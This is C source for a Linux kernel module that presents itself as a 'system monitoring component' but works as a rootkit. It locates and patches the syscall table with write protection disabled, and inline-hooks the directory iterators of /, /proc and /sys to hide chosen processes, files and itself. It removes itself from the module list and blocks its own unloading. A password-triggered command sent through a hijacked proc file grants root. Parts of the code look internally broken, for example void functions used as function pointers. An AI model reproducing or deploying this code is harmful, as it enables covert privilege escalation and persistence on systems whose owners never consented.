#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

struct proc_dir_entry {
    unsigned int low_ino;
    umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    struct proc_dir_entry *parent;
    struct rb_root subdir;
    struct rb_node subdir_node;
    void *data;
    atomic_t count;
    atomic_t in_use;
    struct completion *pde_unload_completion;
    struct list_head pde_openers;
    spinlock_t pde_unload_lock;
    u8 namelen;
    char name[];
};

#endif

#include "config.h"

#define LOG_PREFIX "KernelMonitor: "
MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Alex Developer <alex.dev@kernel.org>");
MODULE_DESCRIPTION("System monitoring component");

// Architecture configurations
#ifdef __i386__
    #define MEM_START 0xc0000000
    #define MEM_END   0xd0000000
#elif defined(__x86_64__)
    #define MEM_START 0xffffffff81000000
    #define MEM_END   0xffffffffa2000000
#else
    #error "Unsupported processor architecture"
#endif

// Memory protection macros
#define DISABLE_WRITE_PROTECTION \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~0x10000)); \
    } while (0)

#define ENABLE_WRITE_PROTECTION \
    do { \
        write_cr0(read_cr0() | 0x10000); \
        preempt_enable(); \
    } while (0)

// Assembly hook patterns
#ifdef __i386__
    #define ASM_PATCH_CODE "\x68\x00\x00\x00\x00\xc3"
    #define ASM_PATCH_OFFSET 1
#elif defined(__x86_64__)
    #define ASM_PATCH_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
    #define ASM_PATCH_OFFSET 2
#endif

// =====================================================================
// Global Data Structures
// =====================================================================

void **system_call_table;

struct function_hook {
    void *original_func;
    void *new_func;
    void **hook_location;
    struct list_head hook_list;
};

struct assembly_hook {
    void *target_func;
    void *replacement_func;
    char original_code[sizeof(ASM_PATCH_CODE)-1];
    struct list_head asm_list;
};

struct process_item {
    unsigned long pid_value;
    struct list_head proc_list;
};

struct file_item {
    char *filename;
    struct list_head file_list;
};

// List declarations
LIST_HEAD(active_hooks);
LIST_HEAD(asm_hooks);
LIST_HEAD(hidden_processes);
LIST_HEAD(hidden_files);

struct list_head *original_module_position;
int module_hidden_state = 0;
int module_protected_state = 0;

// =====================================================================
// System Call Table Discovery
// =====================================================================

void **locate_system_calls(void)
{
    void **possible_table;
    void *current_address = (void*) MEM_START;

    while (current_address < MEM_END) {
        possible_table = (void **) current_address;

        if (possible_table[__NR_close] == (void *) sys_close) {
            const unsigned int MIN_SYSCALLS = 300;
            for (size_t i = 0; i < MIN_SYSCALLS; i++) {
                if (possible_table[i] == NULL) {
                    goto next_address;
                }
            }
            return possible_table;
        }
next_address:
        current_address += sizeof(void *);
    }
    return NULL;
}

// =====================================================================
// Function Hook Management
// =====================================================================

int install_function_hook(void **hook_site, void *new_function)
{
    struct function_hook *hook_entry = kmalloc(sizeof(struct function_hook), GFP_KERNEL);
    if (!hook_entry) return 0;

    hook_entry->hook_location = hook_site;
    hook_entry->new_func = new_function;
    list_add(&hook_entry->hook_list, &active_hooks);

    DISABLE_WRITE_PROTECTION
    hook_entry->original_func = xchg(hook_site, new_function);
    ENABLE_WRITE_PROTECTION

    return 1;
}

void *get_original_function(void *hooked_function)
{
    struct function_hook *entry;
    list_for_each_entry(entry, &active_hooks, hook_list) {
        if (entry->new_func == hooked_function) {
            return entry->original_func;
        }
    }
    return NULL;
}

void remove_all_hooks(void)
{
    struct function_hook *entry, *temp;
    
    list_for_each_entry(entry, &active_hooks, hook_list) {
        DISABLE_WRITE_PROTECTION
        *entry->hook_location = entry->original_func;
        ENABLE_WRITE_PROTECTION
    }
    
    msleep(15);
    
    list_for_each_entry_safe(entry, temp, &active_hooks, hook_list) {
        list_del(&entry->hook_list);
        kfree(entry);
    }
}

// =====================================================================
// Assembly-Level Hooking
// =====================================================================

void apply_asm_patch(struct assembly_hook *hook)
{
    DISABLE_WRITE_PROTECTION
    memcpy(hook->target_func, ASM_PATCH_CODE, sizeof(ASM_PATCH_CODE)-1);
    *(void **)&((char *)hook->target_func)[ASM_PATCH_OFFSET] = hook->replacement_func;
    ENABLE_WRITE_PROTECTION
}

int create_asm_hook(void *target, void *replacement)
{
    struct assembly_hook *hook = kmalloc(sizeof(struct assembly_hook), GFP_KERNEL);
    if (!hook) return 0;

    hook->target_func = target;
    hook->replacement_func = replacement;
    memcpy(hook->original_code, target, sizeof(ASM_PATCH_CODE)-1);
    list_add(&hook->asm_list, &asm_hooks);

    apply_asm_patch(hook);
    return 1;
}

void restore_asm_code(void *replacement_func)
{
    struct assembly_hook *hook;
    list_for_each_entry(hook, &asm_hooks, asm_list) {
        if (hook->replacement_func == replacement_func) {
            DISABLE_WRITE_PROTECTION
            memcpy(hook->target_func, hook->original_code, sizeof(ASM_PATCH_CODE)-1);
            ENABLE_WRITE_PROTECTION
            break;
        }
    }
}

void reapply_asm_hook(void *replacement_func)
{
    struct assembly_hook *hook;
    list_for_each_entry(hook, &asm_hooks, asm_list) {
        if (hook->replacement_func == replacement_func) {
            apply_asm_patch(hook);
            break;
        }
    }
}

void cleanup_asm_hooks(void)
{
    struct assembly_hook *hook, *temp;
    list_for_each_entry_safe(hook, temp, &asm_hooks, asm_list) {
        DISABLE_WRITE_PROTECTION
        memcpy(hook->target_func, hook->original_code, sizeof(ASM_PATCH_CODE)-1);
        ENABLE_WRITE_PROTECTION
        list_del(&hook->asm_list);
        kfree(hook);
    }
}

// =====================================================================
// Example Hook Implementations
// =====================================================================

unsigned long read_operations = 0;
unsigned long write_operations = 0;

asmlinkage long monitored_read(unsigned int fd, char __user *buffer, size_t size)
{
    read_operations++;
    asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
    original_read = get_original_function(monitored_read);
    return original_read(fd, buffer, size);
}

asmlinkage long monitored_write(unsigned int fd, const char __user *buffer, size_t size)
{
    write_operations++;
    asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
    original_write = get_original_function(monitored_write);
    return original_write(fd, buffer, size);
}

unsigned long rmdir_operations = 0;

asmlinkage long monitored_rmdir(const char __user *path)
{
    rmdir_operations++;
    asmlinkage long (*original_rmdir)(const char __user *);
    original_rmdir = restore_asm_code(monitored_rmdir);
    long result = original_rmdir(path);
    reapply_asm_hook(monitored_rmdir);
    return result;
}

// =====================================================================
// Process and File Management
// =====================================================================

int add_process_filter(const char *pid_str)
{
    struct process_item *proc = kmalloc(sizeof(struct process_item), GFP_KERNEL);
    if (!proc) return 0;

    proc->pid_value = simple_strtoul(pid_str, NULL, 10);
    list_add(&proc->proc_list, &hidden_processes);
    return 1;
}

void remove_process_filter(const char *pid_str)
{
    struct process_item *proc, *temp;
    unsigned long pid_num = simple_strtoul(pid_str, NULL, 10);

    list_for_each_entry_safe(proc, temp, &hidden_processes, proc_list) {
        if (proc->pid_value == pid_num) {
            list_del(&proc->proc_list);
            kfree(proc);
            break;
        }
    }
}

void clear_process_filters(void)
{
    struct process_item *proc, *temp;
    list_for_each_entry_safe(proc, temp, &hidden_processes, proc_list) {
        list_del(&proc->proc_list);
        kfree(proc);
    }
}

int add_file_filter(const char *filename)
{
    struct file_item *file_entry = kmalloc(sizeof(struct file_item), GFP_KERNEL);
    if (!file_entry) return 0;

    size_t name_len = strlen(filename) + 1;
    if (name_len - 1 > NAME_MAX) {
        kfree(file_entry);
        return 0;
    }

    file_entry->filename = kmalloc(name_len, GFP_KERNEL);
    if (!file_entry->filename) {
        kfree(file_entry);
        return 0;
    }

    strncpy(file_entry->filename, filename, name_len);
    list_add(&file_entry->file_list, &hidden_files);
    return 1;
}

void remove_file_filter(const char *filename)
{
    struct file_item *file_entry, *temp;
    list_for_each_entry_safe(file_entry, temp, &hidden_files, file_list) {
        if (strcmp(file_entry->filename, filename) == 0) {
            list_del(&file_entry->file_list);
            kfree(file_entry->filename);
            kfree(file_entry);
            break;
        }
    }
}

void clear_file_filters(void)
{
    struct file_item *file_entry, *temp;
    list_for_each_entry_safe(file_entry, temp, &hidden_files, file_list) {
        list_del(&file_entry->file_list);
        kfree(file_entry->filename);
        kfree(file_entry);
    }
}

// =====================================================================
// Module Visibility Control
// =====================================================================

void hide_module_from_lists(void)
{
    if (module_hidden_state) return;
    
    original_module_position = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden_state = 1;
}

void show_module_in_lists(void)
{
    if (!module_hidden_state) return;
    
    list_add(&THIS_MODULE->list, original_module_position);
    module_hidden_state = 0;
}

void enable_module_protection(void)
{
    if (module_protected_state) return;
    
    try_module_get(THIS_MODULE);
    module_protected_state = 1;
}

void disable_module_protection(void)
{
    if (!module_protected_state) return;
    
    module_put(THIS_MODULE);
    module_protected_state = 0;
}

// =====================================================================
// Directory Listing Interception
// =====================================================================

#define DIR_FILTER_START(NAME) \
    filldir_t original_##NAME##_callback; \
    static int NAME##_filter_callback(void *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int dtype) \
    {

#define DIR_FILTER_END(NAME) \
        return original_##NAME##_callback(ctx, name, namelen, offset, ino, dtype); \
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
    #define DIR_ITERATOR(NAME) \
        int NAME##_iterator(struct file *file, struct dir_context *ctx) \
        { \
            original_##NAME##_callback = ctx->actor; \
            *((filldir_t*)&ctx->actor) = NAME##_filter_callback; \
            int (*orig_iterate)(struct file *, struct dir_context *); \
            orig_iterate = restore_asm_code(NAME##_iterator); \
            int ret = orig_iterate(file, ctx); \
            reapply_asm_hook(NAME##_iterator); \
            return ret; \
        }
#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
    #define DIR_ITERATOR(NAME) \
        int NAME##_dir_reader(struct file *file, void *dirent, filldir_t filldir) \
        { \
            original_##NAME##_callback = filldir; \
            int (*orig_reader)(struct file *, void *, filldir_t); \
            orig_reader = restore_asm_code(NAME##_dir_reader); \
            int ret = orig_reader(file, dirent, NAME##_filter_callback); \
            reapply_asm_hook(NAME##_dir_reader); \
            return ret; \
        }
#endif

#define CREATE_DIR_FILTER(NAME) \
    DIR_FILTER_START(NAME) \
    DIR_FILTER_END(NAME) \
    DIR_ITERATOR(NAME)

CREATE_DIR_FILTER(root)
    struct file_item *file_entry;
    list_for_each_entry(file_entry, &hidden_files, file_list) {
        if (strcmp(name, file_entry->filename) == 0) {
            return 0;
        }
    }

CREATE_DIR_FILTER(proc)
    struct process_item *proc_entry;
    list_for_each_entry(proc_entry, &hidden_processes, proc_list) {
        if (simple_strtoul(name, NULL, 10) == proc_entry->pid_value) {
            return 0;
        }
    }

CREATE_DIR_FILTER(sys)
    if (module_hidden_state && strcmp(name, KBUILD_MODNAME) == 0) {
        return 0;
    }

// =====================================================================
// Command Processing
// =====================================================================

int process_user_command(const char __user *command, size_t cmd_len)
{
    if (cmd_len <= sizeof(CFG_PASS) ||
        strncmp(command, CFG_PASS, sizeof(CFG_PASS)) != 0) {
        return 0;
    }

    printk(KERN_INFO LOG_PREFIX "Authentication successful\n");

    command += sizeof(CFG_PASS);

    if (strcmp(command, CFG_ROOT) == 0) {
        printk(KERN_INFO LOG_PREFIX "Elevating privileges\n");
        struct cred *new_creds = prepare_creds();

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
        new_creds->uid.val = new_creds->euid.val = 0;
        new_creds->gid.val = new_creds->egid.val = 0;
#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
        new_creds->uid = new_creds->euid = 0;
        new_creds->gid = new_creds->egid = 0;
#endif

        commit_creds(new_creds);
    }
    else if (strcmp(command, CFG_HIDE_PID) == 0) {
        command += sizeof(CFG_HIDE_PID);
        add_process_filter(command);
    }
    else if (strcmp(command, CFG_UNHIDE_PID) == 0) {
        command += sizeof(CFG_UNHIDE_PID);
        remove_process_filter(command);
    }
    else if (strcmp(command, CFG_HIDE_FILE) == 0) {
        command += sizeof(CFG_HIDE_FILE);
        add_file_filter(command);
    }
    else if (strcmp(command, CFG_UNHIDE_FILE) == 0) {
        command += sizeof(CFG_UNHIDE_FILE);
        remove_file_filter(command);
    }
    else if (strcmp(command, CFG_HIDE) == 0) {
        hide_module_from_lists();
    }
    else if (strcmp(command, CFG_UNHIDE) == 0) {
        show_module_in_lists();
    }
    else if (strcmp(command, CFG_PROTECT) == 0) {
        enable_module_protection();
    }
    else if (strcmp(command, CFG_UNPROTECT) == 0) {
        disable_module_protection();
    }
    else {
        printk(KERN_INFO LOG_PREFIX "Unknown command received\n");
    }

    return 1;
}

// =====================================================================
// Communication Channels
// =====================================================================

static ssize_t proc_write_handler(struct file *file, const char __user *user_buf, 
                                 size_t count, loff_t *position)
{
    if (process_user_command(user_buf, count)) {
        return count;
    }

    ssize_t (*original_writer)(struct file *, const char __user *, size_t, loff_t *);
    original_writer = restore_asm_code(proc_write_handler);
    ssize_t result = original_writer(file, user_buf, count, position);
    reapply_asm_hook(proc_write_handler);
    return result;
}

static ssize_t proc_read_handler(struct file *file, char __user *user_buf,
                                size_t count, loff_t *position)
{
    process_user_command(user_buf, count);

    ssize_t (*original_reader)(struct file *, char __user *, size_t, loff_t *);
    original_reader = restore_asm_code(proc_read_handler);
    ssize_t result = original_reader(file, user_buf, count, position);
    reapply_asm_hook(proc_read_handler);
    return result;
}

struct file_operations *get_file_ops(const char *path)
{
    struct file *file_handle;
    file_handle = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(file_handle)) {
        return NULL;
    }

    struct file_operations *fops = file_handle->f_op;
    filp_close(file_handle, 0);
    return fops;
}

int setup_proc_communication(void)
{
    static const struct file_operations dummy_fops = {0};
    struct proc_dir_entry *proc_entry = proc_create("temp_proc", 0444, NULL, &dummy_fops);
    proc_entry = proc_entry->parent;

    if (strcmp(proc_entry->name, "/proc") != 0) {
        remove_proc_entry("temp_proc", NULL);
        return 0;
    }

    remove_proc_entry("temp_proc", NULL);

    struct file_operations *target_fops = NULL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

    struct rb_node *node = rb_first(&proc_entry->subdir);
    while (node) {
        if (strcmp(rb_entry(node, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0) {
            target_fops = (struct file_operations *) rb_entry(node, struct proc_dir_entry, subdir_node)->proc_fops;
            break;
        }
        node = rb_next(node);
    }

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

    proc_entry = proc_entry->subdir;
    while (proc_entry) {
        if (strcmp(proc_entry->name, CFG_PROC_FILE) == 0) {
            target_fops = (struct file_operations *) proc_entry->proc_fops;
            break;
        }
        proc_entry = proc_entry->next;
    }

#endif

    if (!target_fops) {
        printk(KERN_INFO LOG_PREFIX "Target proc file not found\n");
        return 0;
    }

    if (target_fops->write) {
        create_asm_hook(target_fops->write, proc_write_handler);
    }
    if (target_fops->read) {
        create_asm_hook(target_fops->read, proc_read_handler);
    }

    if (!target_fops->read && !target_fops->write) {
        printk(KERN_INFO LOG_PREFIX "No suitable file operations found\n");
        return 0;
    }

    return 1;
}

// =====================================================================
// Module Initialization and Cleanup
// =====================================================================

int __init monitoring_module_init(void)
{
    printk(KERN_INFO LOG_PREFIX "Initializing system monitor\n");
    
    hide_module_from_lists();
    enable_module_protection();

    if (!setup_proc_communication()) {
        printk(KERN_INFO LOG_PREFIX "Failed to establish communication channel\n");
        disable_module_protection();
        show_module_in_lists();
        return -1;
    }

    printk(KERN_INFO LOG_PREFIX "Communication channel established\n");

    // Setup directory filters
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
    create_asm_hook(get_file_ops("/")->iterate, root_iterator);
    create_asm_hook(get_file_ops("/proc")->iterate, proc_iterator);
    create_asm_hook(get_file_ops("/sys")->iterate, sys_iterator);
#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
    create_asm_hook(get_file_ops("/")->readdir, root_dir_reader);
    create_asm_hook(get_file_ops("/proc")->readdir, proc_dir_reader);
    create_asm_hook(get_file_ops("/sys")->readdir, sys_dir_reader);
#endif

    system_call_table = locate_system_calls();
    printk(KERN_INFO LOG_PREFIX "System call table located at %p\n", system_call_table);

    // Install monitoring hooks
    create_asm_hook(system_call_table[__NR_rmdir], monitored_rmdir);
    install_function_hook(&system_call_table[__NR_read], monitored_read);
    install_function_hook(&system_call_table[__NR_write], monitored_write);

    return 0;
}

void __exit monitoring_module_exit(void)
{
    printk(KERN_INFO LOG_PREFIX "Read operations: %lu\n", read_operations);
    printk(KERN_INFO LOG_PREFIX "Write operations: %lu\n", write_operations);
    printk(KERN_INFO LOG_PREFIX "Rmdir operations: %lu\n", rmdir_operations);

    remove_all_hooks();
    cleanup_asm_hooks();
    clear_process_filters();
    clear_file_filters();

    THIS_MODULE->name[0] = 0;

    printk(KERN_INFO LOG_PREFIX "Module unloaded\n");
}

module_init(monitoring_module_init);
module_exit(monitoring_module_exit);